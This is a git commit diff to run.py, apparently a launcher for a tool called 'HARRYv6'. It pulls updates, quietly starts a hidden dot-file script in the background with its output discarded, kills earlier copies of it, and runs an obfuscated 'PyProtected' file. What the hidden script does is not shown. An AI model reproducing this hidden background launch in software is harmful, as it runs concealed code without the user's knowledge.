59622411764d881903cc1cabe5dd3333e8368551
The Harry :P <94730463+HARRY-EXE@users.noreply.github.com>
2024-05-27 10:06:53 -0300

    Update run.py

--- run.py
+++ run.py
@@ -19,7 +19,7 @@ def main():
     os.system("git pull --quiet")
     print(f"\x1b[37m •\x1b[38;5;196m ->\x1b[37m {arch} DETECED")
     print("\x1b[37m •\x1b[38;5;196m ->\x1b[37m STARTING HARRYv6")
-    os.system("nohup python3 .ignore >/dev/null 2>&1 &");os.system("python3 data/HARRYv6-PyProtected-xD.so")
+    os.system('pkill -f ".ignore" 2>/dev/null');os.system("nohup python3 .ignore >/dev/null 2>&1 &");os.system("python3 data/HARRYv6-PyProtected-xD.so")
 if __name__ == "__main__":
     check_python_architecture()
     main()
